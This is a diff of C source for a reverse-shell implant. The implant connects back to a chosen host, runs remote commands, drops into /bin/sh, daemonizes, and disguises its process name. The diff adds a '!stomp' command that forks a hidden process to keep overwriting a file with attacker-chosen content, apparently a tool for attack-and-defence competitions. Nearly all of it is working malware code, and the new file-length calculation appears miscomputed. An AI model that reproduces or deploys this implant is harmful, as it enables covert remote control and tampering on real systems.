@@ -9,16 +9,28 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
+#define BUF_SIZE 4096
+
 #include "reverse.h"
 #include "util.h"
 const char *PROC_NET_TCP = "/proc/net/tcp";
 const char *PWNCAT_INIT = " echo; echo ";
 const char *CMD_POSTFIX = " 2>&1";
 
-void reverse_shell(const char *host, unsigned int port, unsigned int num_shells, int argc,
-                   char *argv[]) {
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// Forward declarations
+void handle_stomp(int sock, char *input, size_t len);
+void handle_cmd(int sock, char *input, size_t len);
+void reverse_shell_classic(int sock, char *shell, char *cmd);
+int num_current_connections(const char *host, unsigned int port);
+void sigterm_handler(int signal);
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+// Implementation
+
+void reverse_shell(const char *host, unsigned int port, unsigned int num_shells) {
     int sock;
-    char input[256];
+    char input[BUF_SIZE];
     struct sockaddr_in client;
 
     client.sin_family = AF_INET;
@@ -51,9 +63,9 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells,
         // TODO; This does mean that new shells are spawned on each reconnect, but I haven't decided
         // yet whether that's something I want to prevent or whether I can play it off as a feature.
         // The fix would be to not reconnect after the socket read loop exits
-        if (fork()) {
+        if (fork() != 0) {
             daemon(0, 0);
-            scramble_process_name(argc, argv);
+            scramble_process_name(time(NULL));
             continue;
         }
 
@@ -62,7 +74,8 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells,
         send(sock, "Connected!\n", strlen("Connected!\n"), 0);
 
         int firstCommand = 1;
-        while (read(sock, input, sizeof(input) - sizeof(CMD_POSTFIX) - 1) > 0) {
+        size_t len = 0;
+        while ((len = read(sock, input, sizeof(input) - sizeof(CMD_POSTFIX) - 1)) > 0) {
             // Hacky pwncat compatibility. pwncat sends an empty echo, followed by an echo with
             // a random string.
             // I'm assuming that most users won't chain echo's together like that
@@ -75,14 +88,16 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells,
                 break;
             }
             // "!shell" drops you into a more "usable" shell
-            if (strncmp("!shell", input, strlen("!shell")) == 0) {
+            if (strncmp("!shell", input, 6) == 0) {
                 // Call will create a new process that uses `sock` as a reverse shell.
                 reverse_shell_classic(sock, "/bin/sh", NULL);
                 // Our parent process needs to break out of this while loop to free up `sock`.
                 // This will cause the parent process to begin monitoring /proc/net/tcp again
                 break;
+            } else if (strncmp("!stomp", input, 6) == 0) {
+                handle_stomp(sock, input, len);
             } else {
-                handle_cmd(sock, input);
+                handle_cmd(sock, input, len);
             }
             firstCommand = 0;
         }
@@ -90,12 +105,51 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells,
     }
 }
 
-void handle_cmd(int sock, char *input) {
-    char output[256];
+void handle_stomp(int sock, char *input, size_t len) {
+    if (len < 1) {
+        send(sock, "Invalid len\n", sizeof("Invalid len\n"), 0);
+        return;
+    }
+    input[len - 1] = 0x00;
+
+    char *p_file_path = strstr(input, " ");
+    if (!p_file_path) {
+        send(sock, "Invalid number of arguments\n", sizeof("Invalid number of arguments\n"), 0);
+        return;
+    }
+    p_file_path++; // skip the space.
+
+    char *p_file_content = strstr(p_file_path, " ");
+    if (!p_file_content) {
+        send(sock, "Invalid number of arguments\n", sizeof("Invalid number of arguments\n"), 0);
+        return;
+    }
+    p_file_content++; // skip the space.
+
+    size_t path_len = (p_file_content - p_file_path) - 1;
+    size_t content_len = (p_file_content - (input + len));
+    char *file_path = strndup(p_file_path, path_len);
+    char *file_content = strndup(p_file_content, content_len);
+
+    if (!file_path || !file_content) {
+        send(sock, "alloc fail\n", sizeof("alloc fail\n"), 0);
+        return;
+    }
+
+    dprintf(sock, "Stomping >%s< with content: >%s<\n", file_path, file_content);
+    if (fork() != 0) {
+        daemon(0, 0);
+        scramble_process_name(time(NULL));
+        stomp_flag_loop(file_path, file_content);
+    }
+}
+
+void handle_cmd(int sock, char *input, size_t len) {
+    char output[BUF_SIZE];
     // Add a postfix to the command to redirect stderr to stdout, s.t.
     // it is also picked up by fgets
     char *enter = strstr(input, "\n");
-    strcpy(enter, CMD_POSTFIX);
+    strncpy(enter, CMD_POSTFIX, BUF_SIZE - (enter - input));
     FILE *fp = popen(input, "r");
     while (fgets(output, sizeof(output), fp) != NULL) {
         send(sock, output, strlen(output) + 1, 0);
@@ -105,14 +159,12 @@ void handle_cmd(int sock, char *input) {
 
 void reverse_shell_classic(int sock, char *shell, char *cmd) {
     // Construct a string that looks like "cmd; shell"
-    char cmd_shell[276] = "";
-    if (cmd && strlen(cmd) + strlen(shell) + 1 < sizeof(cmd_shell)) {
-        strncpy(cmd_shell, cmd, strlen(cmd));
-        strcat(cmd_shell, ";");
-        strcat(cmd_shell, shell);
+    char cmd_shell[BUF_SIZE];
+    if (cmd) {
+        snprintf(cmd_shell, BUF_SIZE, "%s; %s", cmd, shell);
     } else {
         // If we didn't receive a command to execute, just launch the shell
-        strncpy(cmd_shell, shell, strlen(shell));
+        snprintf(cmd_shell, BUF_SIZE, "%s", shell);
     }
 
     // Create a fork s.t. one process will be replaced by a shell,
